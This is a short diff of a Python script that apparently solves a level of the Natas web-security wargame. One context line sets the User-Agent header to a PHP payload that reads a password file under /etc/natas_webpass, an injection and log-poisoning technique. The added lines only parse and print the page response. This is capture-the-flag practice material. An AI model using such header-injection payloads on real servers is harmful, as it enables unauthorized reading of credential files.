@@ -110,3 +110,5 @@ session.headers['User-Agent'] = "<? echo file_get_contents('/etc/natas_webpass/n
 # firstly, we can use the parameters set previously for the GET request
 # then, we can set the headers of the GET request to the modified session.headers
 response = session.get(URL, params=params, headers=session.headers)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
